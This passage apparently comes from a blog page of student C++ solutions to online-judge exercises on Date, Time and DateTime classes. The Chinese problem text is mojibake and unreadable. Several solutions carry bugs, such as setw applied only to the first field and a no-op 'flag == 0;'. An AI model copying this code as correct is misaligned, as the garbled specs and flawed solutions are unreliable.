class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; s &lt;&lt; endl;
    &#125;

&#125;;
/////////////////////////////
int main()
&#123;
    int cases;
    cin &gt;&gt; cases;
    for(int ca = 0; ca &lt; cases; ca++)
    &#123;
        int year, month, day;
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;
        Date date(year, month, day);
        date.showDate();
        cout &lt;&lt; &quot; &quot;;
        int hour, minute, second;
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;
        Time time(hour, minute, second);
        time.showTime();
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<h3 id="35-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIï¼‰"><a href="#35-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIï¼‰" class="headerlink" title="35.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIï¼‰"></a>35.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIï¼‰</h3><blockquote>
<h2 id="Description-34"><a href="#Description-34" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªæ—¥æœŸæ—¶é—´ç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼ŒæŒ‰æ ¼å¼è¾“å‡ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<p>è®¾è®¡æ—¥æœŸæ—¶é—´ç±»DateTimeç”±2ä¸ªæˆå‘˜ç»„æˆï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªDateç±»å¯¹è±¡å’Œä¸€ä¸ªTimeç±»å¯¹è±¡ï¼›</p>
<p>è®¾è®¡DateTimeç±»éœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>DateTime::DateTime()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥ã€0æ—¶0åˆ†0ç§’ï¼›</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ä¼ å…¥çš„æ—¥æœŸå’Œæ—¶é—´åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>DateTime::DateTime(int,int,int,int,int,int)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>DateTime::showDateTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateTimeå¯¹è±¡ï¼›</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼ï¼›</p>
<p>DateTimeç±»åŒ…å«äº†ä¸¤ä¸ªç±»ï¼šDateç±»å’ŒTimeç±»</p>
<p>è®¾è®¡æ—¥æœŸç±»Dateéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Date::Date()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥</p>
<p>Date::Date(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°å°†æ—¥æœŸåˆå§‹åŒ–ã€‚</p>
<p>Date::showDate()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateå¯¹è±¡ã€‚</p>
<p>Date::setDate(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>è®¾è®¡æ—¶é—´ç±»Timeéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Time::Time()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º0æ—¶0åˆ†0ç§’</p>
<p>Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°å°†æ—¶é—´åˆå§‹åŒ–ã€‚</p>
<p>Time::showTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºTimeå¯¹è±¡ã€‚</p>
<p>Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡DateTimeç±»ã€Dateç±»å’ŒTimeç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-34"><a href="#Input-34" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„å‰3ä¸ªæ•´æ•°æ˜¯æ—¥æœŸçš„å¹´æœˆæ—¥ï¼Œå3ä¸ªæ•´æ•°æ˜¯æ—¶é—´çš„æ—¶åˆ†ç§’ã€‚</p>
<h2 id="Output-34"><a href="#Output-34" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚æ—¥æœŸçš„è¾“å‡ºæ ¼å¼ä¸ºâ€œyyyy-mm-ddâ€ï¼Œæ—¶é—´çš„è¾“å‡ºæ ¼å¼ä¸ºâ€œhh:mm:ssâ€ï¼Œä¸­é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚</p>
<h2 id="Sample-Input-34"><a href="#Sample-Input-34" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-34"><a href="#Sample-Output-34" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1000-10-10 01:01:011982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-34"><a href="#HINT-34" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-34"><a href="#Append-Code-34" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1575&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Date&#123;
public:
    friend class DateTime;
    int y,m,d;
    Date():y(1),m(1),d(1)&#123;&#125;
    Date(int yy,int mm,int dd):y(yy),m(mm),d(dd)&#123;&#125;
    void showDate()&#123;cout &lt;&lt; y &lt;&lt; &quot;-&quot; &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; m &lt;&lt; &quot;-&quot; &lt;&lt; d &lt;&lt; &quot; &quot;;&#125;
    Date&amp; setDate(int yy,int mm,int dd)&#123;y=yy;m=mm;d=dd;return *this;&#125;
&#125;;
class Time&#123;
public:
    friend class DateTime;
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; s ;&#125;
    Time&amp; setTime(int hh,int mm,int ss)&#123;h=hh;m=mm;s=ss;return *this;&#125;
&#125;;
class DateTime&#123;
public:
    friend class Date;
    friend class Time;
    Date D;
    Time T;
    DateTime():D(0,0,0),T(0,0,0)&#123;&#125;
    DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;&#125;
    DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;&#125;
    void showDateTime()&#123;D.showDate();T.showTime();&#125;
    DateTime&amp; setDateTime(int a,int b,int c,int d,int e,int f)&#123;D.y=a;D.m=b;D.d=c;T.h=d;T.m=e;T.s=f;return *this;&#125;
&#125;;
///////////////////
int main()
&#123;
    Date date(1000, 10, 10);
    Time time(1, 1, 1);
    DateTime date_time(date, time);
    date_time.showDateTime();
    cout &lt;&lt; endl;
    int cases, flag = 0;
    cin &gt;&gt; cases;
    for(int ca = 0; ca &lt; cases; ca++)
    &#123;
        int year, month, day;
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;
        int hour, minute, second;
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;
        if(flag == 0)
        &#123;
            flag = 1;
            DateTime dt(year, month, day, hour, minute, second);
            dt.showDateTime();
        &#125;
        else if(flag == 1)
        &#123;
            flag == 0;
            date_time.setDateTime(year, month, day, hour, minute, second).showDateTime();
        &#125;
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<h3 id="36-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIIï¼‰"><a href="#36-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIIï¼‰" class="headerlink" title="36.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIIï¼‰"></a>36.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIIIï¼‰</h3><blockquote>
<h2 id="Description-35"><a href="#Description-35" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªæ—¥æœŸæ—¶é—´ç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼ŒæŒ‰æ ¼å¼è¾“å‡ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<p>è®¾è®¡æ—¥æœŸæ—¶é—´ç±»DateTimeç”±2ä¸ªæˆå‘˜ç»„æˆï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªDateç±»å¯¹è±¡å’Œä¸€ä¸ªTimeç±»å¯¹è±¡ï¼›</p>
<p>è®¾è®¡DateTimeç±»éœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>DateTime::DateTime()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥ã€0æ—¶0åˆ†0ç§’ï¼›</p>
<p>DateTime::DateTime(int,int,int,int,int,int)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>åœ¨ä¸Šè¿°ä¸¤ä¸ªDateTimeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE DateTime : (y, m, d, hh, mm, ss)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ï¼Œhã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ä¼ å…¥çš„æ—¥æœŸå’Œæ—¶é—´åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>åœ¨è¿™ä¸ªDateTimeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE DateTime : (y, m, d) (hh, mm, ss)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ï¼Œhã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>DateTime::showDateTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateTimeå¯¹è±¡ï¼›</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼ï¼›</p>
<p>DateTimeç±»åŒ…å«äº†ä¸¤ä¸ªç±»ï¼šDateç±»å’ŒTimeç±»</p>
<p>è®¾è®¡æ—¥æœŸç±»Dateéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Date::Date()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥</p>
<p>Date::Date(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°å°†æ—¥æœŸåˆå§‹åŒ–ã€‚</p>
<p>åœ¨Dateç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE Date : (y, m, d)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>Date::showDate()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateå¯¹è±¡ã€‚</p>
<p>Date::setDate(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>è®¾è®¡æ—¶é—´ç±»Timeéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Time::Time()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º0æ—¶0åˆ†0ç§’</p>
<p>Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°å°†æ—¶é—´åˆå§‹åŒ–ã€‚</p>
<p>åœ¨Timeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE Time : (h, m, s)â€ï¼Œå…¶ä¸­hã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡º</p>
<p>Time::showTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºTimeå¯¹è±¡ã€‚</p>
<p>Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡DateTimeç±»ã€Dateç±»å’ŒTimeç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°</p>
<h2 id="Input-35"><a href="#Input-35" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„å‰3ä¸ªæ•´æ•°æ˜¯æ—¥æœŸçš„å¹´æœˆæ—¥ï¼Œå3ä¸ªæ•´æ•°æ˜¯æ—¶é—´çš„æ—¶åˆ†ç§’ã€‚</p>
<h2 id="Output-35"><a href="#Output-35" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚æ—¥æœŸçš„è¾“å‡ºæ ¼å¼ä¸ºâ€œyyyy-mm-ddâ€ï¼Œæ—¶é—´çš„è¾“å‡ºæ ¼å¼ä¸ºâ€œhh:mm:ssâ€ï¼Œä¸­é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚</p>
<h2 id="Sample-Input-35"><a href="#Sample-Input-35" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-35"><a href="#Sample-Output-35" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>CREATE Time : (0, 0, 0)CREATE Date : (1, 1, 1)CREATE DateTime : (1, 1, 1, 0, 0, 0)0001-01-01 00:00:001982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-35"><a href="#HINT-35" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-35"><a href="#Append-Code-35" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1576&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;algorithm&gt;  
#include &lt;iomanip&gt;  
using namespace std;  


class Time&#123;  
   private:  
      friend class DateTime;  
      int hh,mm,ss;  
   public:  
      Time():hh(0),mm(0),ss(0)&#123;  
          cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(int a,int b,int c):hh(a),mm(b),ss(c)&#123;&#125;  
      Time &amp;setTime(int a,int b,int c)&#123;hh=a;mm=b;ss=c;return *this;&#125;  
      void showTime()&#123;  
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;hh&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;mm&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;ss;  
      &#125;  
      ~Time()&#123;&#125;  
&#125;;  

class Date&#123;  
   private:  
       friend class DateTime;  
       int year,month,day;  
   public:  
       Date():year(1),month(1),day(1)&#123;  
           cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date(int a,int b,int c):year(a),month(b),day(c)&#123;&#125;  
       Date &amp;setDate(int a,int b,int c)&#123;year=a;month=b;day=c;return *this;&#125;  
       void showDate() &#123;  
           cout&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(4)&lt;&lt;year&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;month&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;day&lt;&lt;&quot; &quot;;  
       &#125;  
       ~Date()&#123;&#125;  
&#125;;  



class DateTime&#123;  
   private:  
       friend class Date;  
       friend class Time;  
       Time T;  
       Date D;  
       int year1,month1,day1,hh1,mm1,ss1;  
   public:  
       DateTime()&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;, &quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;&#125;  
       DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;&#125;  
       void showDateTime()&#123;  
         D.showDate();  T.showTime();  
       &#125;  
       DateTime &amp;setDateTime(int a,int b,int c,int d,int e,int f)&#123;  
           D.setDate(a,b,c);T.setTime(d,e,f);return *this;  
       &#125;  
       ~DateTime()&#123;&#125;  
&#125;;  

int main()  
&#123;  
    DateTime date_time;  
    date_time.showDateTime();  
    cout &lt;&lt; endl;  
    int cases;  
    cin &gt;&gt; cases;  
    for(int ca = 0; ca &lt; cases; ca++)  
    &#123;  
        int year, month, day;  
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;  
        int hour, minute, second;  
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;  
        date_time.setDateTime(year, month, day, hour, minute, second);  
        date_time.showDateTime();  
        cout &lt;&lt; endl;  
    &#125;  
&#125;  </code></pre>
<h3 id="37-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIVï¼‰"><a href="#37-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIVï¼‰" class="headerlink" title="37.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIVï¼‰"></a>37.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIVï¼‰</h3><blockquote>
<h2 id="Description-36"><a href="#Description-36" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªæ—¥æœŸæ—¶é—´ç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼ŒæŒ‰æ ¼å¼è¾“å‡ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<p>è®¾è®¡æ—¥æœŸæ—¶é—´ç±»DateTimeç”±2ä¸ªæˆå‘˜ç»„æˆï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªDateç±»å¯¹è±¡å’Œä¸€ä¸ªTimeç±»å¯¹è±¡ï¼›</p>
<p>è®¾è®¡DateTimeç±»éœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>DateTime::DateTime()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥ã€0æ—¶0åˆ†0ç§’ï¼›</p>
<p>DateTime::DateTime(int,int,int,int,int,int)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>åœ¨ä¸Šè¿°ä¸¤ä¸ªDateTimeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE DateTime : (y, m, d, hh, mm, ss)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ï¼Œhã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)æ„é€ æ–¹æ³•ï¼šä¾ç…§å‚æ•°ä¼ å…¥çš„æ—¥æœŸå’Œæ—¶é—´åˆå§‹åŒ–å¯¹è±¡ï¼›</p>
<p>åœ¨è¿™ä¸ªDateTimeç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE DateTime : (y, m, d) (hh, mm, ss)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ï¼Œhã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>DateTime:DateTime(const DateTime&amp;)æ„é€ æ–¹æ³•ï¼šæ‹·è´æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å¯¹è±¡ã€‚</p>
<p>åœ¨æ‹·è´æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCOPY   DateTime : (y, m, d) (hh, mm, ss)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ï¼Œhã€mã€sä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„æ—¶åˆ†ç§’å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>DateTime::showDateTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateTimeå¯¹è±¡ï¼›</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)æ–¹æ³•ï¼šä¾ç…§å‚æ•°ï¼ˆé¡ºåºä¸ºå¹´æœˆæ—¥ã€æ—¶åˆ†ç§’ï¼‰ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼ï¼›</p>
<p>ç¼–å†™DateTimeç±»çš„è¯»å†™å‡½æ•°ï¼šyear()ã€month()ã€day()ã€hour()ã€minute()ã€second()ã€‚è¯»å†™å‡½æ•°çš„å‚æ•°ã€è¿”å›å€¼å‚è§main()å‡½æ•°ã€‚</p>
<p>DateTimeç±»åŒ…å«äº†ä¸¤ä¸ªç±»ï¼šDateç±»å’ŒTimeç±»</p>
<p>è®¾è®¡æ—¥æœŸç±»Dateéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Date::Date()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º1å¹´1æœˆ1æ—¥</p>
<p>Date::Date(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°å°†æ—¥æœŸåˆå§‹åŒ–ã€‚</p>
<p>åœ¨Dateç±»çš„æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCREATE Date : (y, m, d)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>Date::Date(const Date&amp;)æ„é€ æ–¹æ³•ï¼šæ‹·è´æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å¯¹è±¡ã€‚</p>
<p>åœ¨æ‹·è´æ„é€ å‡½æ•°ä¸­è¾“å‡ºï¼šâ€œCOPY   Date : (y, m, d)â€ï¼Œå…¶ä¸­yã€mã€dä¸ºåˆå§‹åŒ–å¯¹è±¡æ—¶çš„å¹´æœˆæ—¥å€¼ã€‚å‚è§è¾“å‡ºã€‚</p>
<p>Date::showDate()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºDateå¯¹è±¡ã€‚</p>
<p>Date::setDate(int,int,int)æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°ä¿®æ”¹å¯¹è±¡çš„å±æ€§å€¼</p>
<p>è®¾è®¡æ—¶é—´ç±»Timeéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Time::Time()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–ä¸º0æ—¶0åˆ†0ç§’</p>
